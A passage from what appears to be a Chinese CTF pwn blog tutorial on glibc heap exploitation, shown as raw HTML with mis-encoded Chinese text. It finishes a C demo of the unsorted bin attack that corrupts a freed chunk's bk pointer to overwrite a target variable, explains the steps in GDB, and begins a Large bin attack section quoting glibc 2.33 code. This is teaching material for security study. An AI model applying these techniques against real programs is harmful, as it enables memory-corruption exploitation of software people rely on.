  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"bk pointer point to %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/*------------VULNERABILITY-----------*/</span>

  p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>target_var <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">//------------------------------------</span>

  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ GDB è°ƒè¯•åˆ†æä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹</p><p>é¦–å…ˆåˆ†é…äº†ä¸¤ä¸ªå †å— <code>chunk1</code> å’Œ <code>chunk2</code>ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå †å—ç”¨æ¥é˜²æ­¢ä¸ <code>top chunk</code> åˆå¹¶</p><p>ç„¶åé‡Šæ”¾ <code>chunk1</code>ï¼Œå°†å…¶ç½®äº <code>unsorted bin</code> ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶ <code>bk</code> æŒ‡é’ˆæŒ‡å‘ <code>0x00007ffff7dd1b78</code>ï¼Œç”±äºæ­¤æ—¶ <code>unsorted bin</code> åªæœ‰ä¸€ä¸ªï¼Œå› æ­¤ <code>fd</code> ä¸ <code>bk</code> æŒ‡é’ˆç›¸åŒ</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A866.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨66.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A873.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨73.png"></p><p>å‡è®¾æˆ‘ä»¬é€šè¿‡å †æº¢å‡ºæˆ–å…¶ä»–æ‰‹æ®µä¿®æ”¹ <code>bk</code> æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘ <code>target_var - 16</code> çš„ä½ç½®ï¼ˆè¿™é‡Œæ˜¯ä»¥ 64 ä½ç¨‹åºä½œä¸ºç¤ºä¾‹ï¼Œå¦‚æœæ˜¯ 32 ä½ç¨‹åºï¼Œåˆ™æŒ‡å‘ <code>target_var - 8</code> çš„ä½ç½®ï¼‰</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A867.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨67.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A872.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨72.png"></p><p><code>target_var - 16</code> å¤„æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ <code>chunk</code>ï¼Œå³ï¼š<code>target_var</code> å¤„äºä¼ªé€  <code>chunk</code> çš„ <code>fd</code> å¤„</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A868.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨68.png"></p><p>ç„¶åï¼Œæˆ‘ä»¬é€šè¿‡ <code>malloc(400)</code> å†æ¬¡ç”³è¯·ç›¸åŒå¤§å°çš„ç©ºé—´</p><p>ç”±äºæ‰€ç”³è¯·çš„ <code>chunk</code> å¤„äº <code>small bin</code> æ‰€åœ¨çš„èŒƒå›´ï¼Œå…¶å¯¹åº”çš„ <code>bin</code> ä¸­æš‚æ—¶æ²¡æœ‰ <code>chunk</code>ï¼Œæ‰€ä»¥ä¼šå» <code>unsorted bin</code> ä¸­æ‰¾ï¼Œå‘ç° <code>unsorted bin</code> ä¸ä¸ºç©ºï¼Œäºæ˜¯æŠŠ <code>unsorted bin</code> ä¸­çš„æœ€åä¸€ä¸ª <code>chunk</code> å–å‡ºæ¥ï¼Œè€Œ <code>unsorted bin</code> ä¸­çš„æœ€åä¸€ä¸ª <code>chunk</code> æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ <code>chunk</code></p><p>æ­¤æ—¶å †å¹¶æ²¡æœ‰ä»€ä¹ˆæ”¹å˜ï¼Œä¾ç„¶æ˜¯ <code>unsorted bin</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A869.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨69.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A871.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨71.png"></p><p>ä½†æ˜¯ <code>0x7fffffffdc88</code>ï¼ˆ<code>target_var</code>ï¼‰åœ°å€å¤„å·²ç»è¢«ä¿®æ”¹ä¸º&nbsp;<code>unsorted bin</code> çš„é“¾è¡¨å¤´éƒ¨ <code>0x00007ffff7dd1b78</code>ï¼Œå³ <code>fd</code> æŒ‡é’ˆï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A870.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨70.png"></p><blockquote><p>æ³¨æ„ï¼š</p><p>è™½ç„¶æˆ‘ä»¬ä¿®æ”¹äº†&nbsp;<code>target</code> å¤„çš„å€¼ï¼Œä½† <code>unsorted bin</code> é“¾è¡¨ä¹Ÿå¯èƒ½å°±æ­¤ç ´åï¼Œåœ¨æ’å…¥ <code>chunk</code> æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜</p></blockquote><p>ä»ä¸Šé¢çš„ç¤ºä¾‹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<strong>Unsorted bin Attack ç¡®å®å¯ä»¥ä¿®æ”¹ä»»æ„åœ°å€çš„å€¼ï¼Œä½†æ˜¯æ‰€ä¿®æ”¹æˆçš„å€¼å´ä¸å—æˆ‘ä»¬æ§åˆ¶ï¼Œå”¯ä¸€å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œè¿™ä¸ªå€¼æ¯”è¾ƒå¤§</strong>ï¼Œä¸€èˆ¬å¯ä»¥ä½œä¸ºä»¥ä¸‹ç”¨é€”ï¼š</p><ul><li>æˆ‘ä»¬é€šè¿‡ä¿®æ”¹å¾ªç¯çš„æ¬¡æ•°æ¥ä½¿å¾—ç¨‹åºå¯ä»¥æ‰§è¡Œå¤šæ¬¡å¾ªç¯</li><li>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ <code>heap</code> ä¸­çš„ <code>global_max_fast</code> æ¥ä½¿å¾—æ›´å¤§çš„ <code>chunk</code> å¯ä»¥è¢«è§†ä¸º <code>fast bin</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å»æ‰§è¡Œä¸€äº› <code>fast bin attack</code> äº†</li></ul><hr><h1 id="Large-bin-Attack"><a href="#Large-bin-Attack" class="headerlink" title="Large bin Attack"></a>Large bin Attack</h1><blockquote><p>Large bin Attack æ˜¯ä¸€ç±»æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ˜¯æŒ‡æ‰€æœ‰åŸºäº <code>large bin</code> æœºåˆ¶çš„æ¼æ´åˆ©ç”¨æ–¹æ³•</p><p>å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9sYXJnZS1iaW4tYXR0YWNrLw==">Large Bin Attack - CTF Wiki</a></p></blockquote><p>Large bin Attack ä¸»è¦åˆ©ç”¨çš„æ˜¯ <code>chunk</code> è¿›å…¥ <code>bin</code> ä¸­çš„æ“ä½œï¼Œåœ¨ <code>malloc</code> çš„æ—¶å€™ï¼Œéå† <code>unsorted bin</code> æ—¶ï¼Œå¯¹æ¯ä¸€ä¸ª <code>chunk</code>ï¼Œè‹¥æ— æ³• <code>exact-fit</code> åˆ†é…æˆ–ä¸æ»¡è¶³åˆ‡å‰²åˆ†é…çš„æ¡ä»¶ï¼Œå°±ä¼šå°†è¯¥ <code>chunk</code> ç½®å…¥ç›¸åº”çš„ <code>bin</code> ä¸­ï¼Œè€Œæ­¤è¿‡ç¨‹ä¸­ç¼ºä¹å¯¹ <code>large bin</code> çš„è·³è¡¨æŒ‡é’ˆçš„æ£€æµ‹</p><p>Glibc 2.33 ä¸­å…³äº Large bin çš„å…¥ bin æ“ä½œï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">else</span>
            <span class="token punctuation">{</span>
              victim_index <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
              bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
              fwd <span class="token operator">=</span> bck<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>

              <span class="token comment">/* maintain large bins in sorted order */</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                  <span class="token comment">/* Or with inuse bit to speed comparisons */</span>
                  size <span class="token operator">|=</span> PREV_INUSE<span class="token punctuation">;</span>
                  <span class="token comment">/* if smaller than smallest, bypass loop below */</span>
                  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>bck<span class="token operator">-&gt;</span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span>
              <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>bck<span class="token operator">-&gt;</span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                      fwd <span class="token operator">=</span> bck<span class="token punctuation">;</span>
                      bck <span class="token operator">=</span> bck<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>

                      victim<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>
                      victim<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>
                      fwd<span class="token operator">-&gt;</span>fd<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                  <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
                      <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                          fwd <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd_nextsize<span class="token punctuation">;</span>
              <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size
              <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token comment">/* Always insert in the second position.  */</span>
                        fwd <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>
                      <span class="token keyword">else</span>
                        <span class="token punctuation">{</span>
                          victim<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
                          victim<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>
                          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">!=</span> fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): largebin double linked list corrupted (nextsize)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                          fwd<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                          victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                      bck <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>
                      <span class="token keyword">if</span> <span class="token punctuation">(</span>bck<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> fwd<span class="token punctuation">)</span>
                        <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): largebin double linked list corrupted (bk)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ Glibc 2.29 åŠä»¥ä¸‹çš„ç‰ˆæœ¬ä¸­ï¼Œæ ¹æ® <code>unsorted bin chunk</code> çš„å¤§å°ä¸åŒ</p><p>åœ¨ <code>unsorted bin chunk</code> å°äºé“¾è¡¨ä¸­æœ€å°çš„ <code>chunk</code> çš„æ—¶å€™ä¼šæ‰§è¡Œå‰ä¸€å¥ï¼Œåä¹‹æ‰§è¡Œåä¸€å¥ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">fwd<span class="token operator">-&gt;</span>fd<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç”±äºä¸¤è€…å¤§å°ç›¸åŒçš„æ—¶å€™åªä¼šä½¿ç”¨å¦‚ä¸‹çš„æ–¹æ³•æ’å…¥ï¼Œæ‰€ä»¥æ­¤æ—¶æ— æ³•åˆ©ç”¨ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size
              <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token comment">/* Always insert in the second position.  */</span>
                        fwd <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>å †ç›¸å…³æ¼æ´ä¸åˆ©ç”¨</h></span></div><div class="post-copyright__type"><span class="post-copyright-info">æœ¬æ–‡é“¾æ¥ï¼š<a href="https://www.uf4te.cn/posts/baa7ab63.html">https://www.uf4te.cn/posts/baa7ab63.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a" style="padding-left:6px;display:inline-block;width:120px"><h>ä½œè€…</h><div class="post-copyright-cc-info"><h>uf4te</h></div></div><div class="post-copyright-c" style="padding-left:6px;display:inline-block;width:120px"><h>å‘å¸ƒäº</h><div class="post-copyright-cc-info"><h>2024-05-27</h></div></div><div class="post-copyright-u" style="padding-left:6px;display:inline-block;width:120px"><h>æ›´æ–°äº</h><div class="post-copyright-cc-info"><h>2024-06-07</h></div></div><div class="post-copyright-c" style="padding-left:6px;display:inline-block;width:120px"><h>è®¸å¯åè®®</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY 4.0" href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/cover-126.jpg" data-sites="facebook, twitter, wechat, weibo, qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> å¥–åŠ±ä¸€ä¸‹ç«™é•¿</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/rewards/wechat.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rewards/wechat.png" alt="å¾®ä¿¡æ”¯ä»˜"></a><div class="post-qr-code-desc">å¾®ä¿¡æ”¯ä»˜</div></li><li class="reward-item"><a href="/img/rewards/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rewards/alipay.jpg" alt="æ”¯ä»˜å®"></a><div class="post-qr-code-desc">æ”¯ä»˜å®</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/13f0410d.html" title="Androidé€†å‘ä¸åŠ¨æ€è°ƒè¯•"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-125.jpg" onerror='onerror=null,src="/img/404/pic_404.png"' alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">Androidé€†å‘ä¸åŠ¨æ€è°ƒè¯•</div></div></a></div><div class="next-post pull-right"><a href="/posts/18c02ebd.html" title="ã€Asis CTF 2016ã€‘b00ks"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-127.jpg" onerror='onerror=null,src="/img/404/pic_404.png"' alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">ã€Asis CTF 2016ã€‘b00ks</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/posts/c695aa69.html" title="Bypasså®‰å…¨æœºåˆ¶"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-117.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-10-15</div><div class="title">Bypasså®‰å…¨æœºåˆ¶</div></div></a></div><div><a href="/posts/cfa3ef5.html" title="Linuxä¸‹çš„ä¿æŠ¤æœºåˆ¶"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-65.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-06-05</div><div class="title">Linuxä¸‹çš„ä¿æŠ¤æœºåˆ¶</div></div></a></div><div><a href="/posts/29133b28.html" title="PLTè¡¨å’ŒGOTè¡¨"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-64.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-06-05</div><div class="title">PLTè¡¨å’ŒGOTè¡¨</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="author_top is-center"><div class="card-info-avatar"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg" onerror='this.onerror=null,this.src="/img/404/loading_404.gif"' alt="avatar"></div><div class="author-status-box"><div class="author-status"><g-emoji class="g-emoji" alias="palm_tree" fallback-src="https://lskypro.acozycotage.net/LightPicture/2022/12/fe1dc0402e623096.jpg">ğŸ˜’</g-emoji><span>ç–²æƒ«å¿ƒç´¯</span></div></div></div><div class="author-info__name">uf4te</div><div class="author-info__description">å¤©é“é…¬å‹¤</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">8</div></a><a href="/commentwall/"><div class="headline">è¯„è®º</div><div class="length-num comment-total">0</div></a><a href="/about/#reward-me"><div class="headline">èµåŠ©</div><div class="length-num reward-total">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/uf4te/uf4te.github.io"><i class="fab fa-github"></i><span>ç»™æˆ‘çš„ç½‘ç«™ä¸€ä¸ªstar ğŸ¤—</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:916884674@qq.com" target="_blank" title="mail æˆ‘çš„é‚®ç®±"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/img/me/QRCode_QQ.png" target="_blank" title="åŠ æˆ‘ QQ"><i class="fa-brands fa-qq"></i></a><a class="social-icon" href="/img/me/QRCode_WeChat.png" target="_blank" title="åŠ æˆ‘å¾®ä¿¡"><i class="fa-brands fa-weixin"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS è®¢é˜…"><i class="fa-solid fa-square-rss"></i></a><a class="social-icon" href="/about/#reward-me" target="_blank" title="èµåŠ©æœ¬ç«™"><i class="fa-sharp fa-solid fa-heart-circle-bolt"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fa-solid fa-medal"></i><span>æ¬¢è¿æ¥åˆ°æˆ‘çš„å°ç«™</span></div><div class="announcement_content">æˆ‘æ˜¯ä¸€ä¸ªå–œæ¬¢å­¦ä¹  PWN å’Œé€†å‘çš„äºŒè¿›åˆ¶ CTFerï¼ŒåŠ æ²¹ï¼Œäº’å‹‰ï¼</div><div style="margin-bottom:8px"></div><div class="item-headline"><i class="fa-solid fa-hourglass-half fa-shake"></i><span>è®¡æ—¶å°åŠ©æ‰‹</span></div><div id="timing"></div><div style="margin-bottom:8px"></div><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>æœ€æ–°å…¬å‘Š</span></div><div class="newest_announcement_content">å¯ä»¥åœ¨ã€Šäº’åŠ¨ -&gt; æˆ‘çš„è¯´è¯´ã€‹ä¸‹æŸ¥çœ‹æœ¬ç«™çš„æ›´æ–°åŠåŠ¨æ€ï¼š<a href="https://www.uf4te.cn/artitalk/" target="_blank" title="ç‚¹å‡»ç›´è¾¾">æˆ‘çš„è¯´è¯´</a></div></div><div 